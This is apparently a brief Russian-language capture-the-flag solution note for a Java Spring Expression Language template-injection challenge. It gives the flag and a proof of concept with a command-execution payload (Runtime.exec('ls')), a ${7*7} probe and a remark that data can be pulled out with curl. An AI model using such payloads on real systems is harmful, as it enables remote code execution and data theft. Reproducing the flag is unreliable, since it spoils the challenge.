#Флаг
SSTI_JAVA_SPEL_THIS_INJECTION


# POC

1) Перейти на вкладку reviews - оба поля уязвимы к SPEL инъекции.
1) ${T(java.lang.Runtime).getRuntime().exec('ls')}
2) ${7*7}


Данные можно вытащить с помощью CURL

